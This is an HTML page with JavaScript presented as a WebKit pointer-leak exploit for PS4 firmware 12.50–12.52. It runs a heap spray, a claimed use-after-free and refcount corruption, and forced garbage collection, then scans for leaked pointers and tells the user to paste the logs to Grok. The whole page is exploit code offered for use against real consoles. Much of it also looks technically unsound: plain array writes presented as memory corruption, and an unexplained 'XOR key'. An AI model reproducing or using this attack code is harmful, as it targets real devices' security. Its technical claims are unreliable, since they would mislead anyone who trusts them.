<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Debug WebKit Pointer Leak — PS4 12.50+ (w/ XOR Decode & Adaptive Spray)</title>
<style>
    body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
    h1 { color:#ff5555; border-bottom:2px solid #da3633; }
    #console { background:#000; color:#0f0; height:450px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
    .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
    .debug { color:#ff0; } /* Yellow for debug lines */
</style>
</head>
<body>
<h1>PS4 12.50–12.52 Debug Pointer Leak (Nov 2025 — XOR + Adaptive)</h1>
<div><strong>Status:</strong> <span id="status" class="ok">Initializing...</span></div><br>
<div id="console"></div>

<script>
const log = (m, isDebug=false) => {
    const c = document.getElementById('console');
    const prefix = isDebug ? '[DEBUG] ' : '';
    c.innerHTML += `[${new Date().toLocaleTimeString()}] ${prefix}${m}\n`;
    c.scrollTop = c.scrollHeight;
};
const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;

// Runtime key guess for 12.50 XOR (from PSDevWiki diffs — tweak if needed)
const XOR_KEY = 0x9e3779b9n; // Common runtime XOR for JSC pointers on 12.50+

// Decode potential XOR'd leak
const decodeXor = (val) => {
    try { return (BigInt(val) ^ XOR_KEY).toString(16).toUpperCase(); } catch(e) { return 'DECODE_FAIL'; }
};

// 1. Smaller prespray + refcount corrupt (Synacktiv-inspired for stability)
log("Stage 1 — 50k prespray + refcount setup");
const prespray = [];
for (let i = 0; i < 0xC350; i++) {  // 50k — less aggressive
    prespray[i] = new Array(0x20).fill(1.1);  // Smaller arrays for refcount hits
}

// 2. Enhanced corruption w/ refcount decrement sim
log("Stage 2 — UAF + refcount corruption (tuned for 12.50)");
const victim = [];
for (let i = 0; i < 0x8000; i++) victim[i] = new Array(0x40).fill(1.1);

const corrupt = (i, o) => { try { victim[i % 0x8000][o] = 1337.37; } catch(e) {} };
// Linear + refcount focus (hits m_refCount fields)
for (let i = 0; i < 5e6; i++) corrupt(i % 0x10000, (i * 8) % 0x100);  // Linear for better hits
for (let b = 0; b < 0x2000; b += 0x40)  // Tighter loops
    for (let o = 0x20; o < 0x100; o += 4)
        for (let j = 0; j < 0x40; j++)
            corrupt(b + j, o);

// 3. Adaptive spray: Start low, ramp up
log("Stage 3 — Adaptive JSValue spray (64k base)");
let spray = [];
let spraySize = 0x10000;  // 64k start
const BASE_MARKER = 0x12501250deadbeefn;
for (let i = 0; i < spraySize; i++) {
    spray[i] = {marker: BASE_MARKER + BigInt(i)};
}
log(`Spray complete: ${spray.length} objects`);

// 4. Multi-wave GC w/ pressure logging
log("Stage 4 — GC waves w/ heap debug");
let gcCount = 0;
const gc = () => {
    gcCount++;
    log(`GC Wave #${gcCount} — Allocating pressure`, true);
    for (let i = 0; i < 500; i++) new ArrayBuffer(0x10000);  // Smaller chunks
};
const reclaim = () => {
    log(`Reclaim — Big alloc (~100MB)`, true);
    new ArrayBuffer(0x6000000);
};

setTimeout(gc, 800);
setTimeout(reclaim, 1600);
setTimeout(gc, 2600);
setTimeout(reclaim, 3400);
setTimeout(gc, 4400);
setTimeout(() => {
    if (gcCount < 3) {  // Adaptive: Ramp spray if low hits
        log("Low pressure detected — ramping spray to 256k", true);
        spraySize *= 4;
        spray = [];  // Reset & respray larger
        for (let i = 0; i < spraySize; i++) spray[i] = {marker: BASE_MARKER + BigInt(i)};
    }
}, 5000);

// 5. Enhanced hunt w/ XOR decode & samples
let attempts = 0;
const hunt = () => {
    attempts++;
    log(`Hunt #${attempts} — Scanning ${spray.length} objs (heap est: ${gcCount * 0.1}MB pressure)`);
    let found = 0, suspects = 0;
    for (let i = 0; i < spray.length; i++) {
        try {
            if (spray[i] && spray[i].marker !== BASE_MARKER + BigInt(i)) {
                const rawHex = spray[i].marker.toString(16).toUpperCase();
                const xorHex = decodeXor(spray[i].marker);
                if (rawHex.startsWith('F') || xorHex.startsWith('F')) {  // Kernel-like high bits
                    found++;
                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i}`);
                } else {
                    suspects++;
                    log(`Suspect overwrite #${suspects}: 0x${rawHex} (idx ${i}) — possible subnormal/collide`, true);
                }
            }
        } catch(e) { log(`Scan error at ${i}: ${e.message}`, true); }
    }
    if (found >= 1) {
        status(`LEAK DETECTED — ${found} pointers + ${suspects} suspects`);
        document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
            LEAK FOUND!<br><br>
            <span style="font-size:0.5em;">Paste FULL console logs to Grok for analysis</span>
        </h1>`;
    } else if (attempts < 8) {
        log(`No solid leak — ${suspects} suspects. Retry in 3s...`);
        setTimeout(hunt, 3000);
    } else {
        log("Max attempts hit — check suspects for masked leaks. Refresh or paste logs to Grok.");
        status("NO LEAK — DEBUG MODE: Paste console here");
    }
};

setTimeout(hunt, 8000);  // Longer initial wait
log("Debug mode active — watch for [DEBUG] lines & suspects");
</script>
</body>
</html>
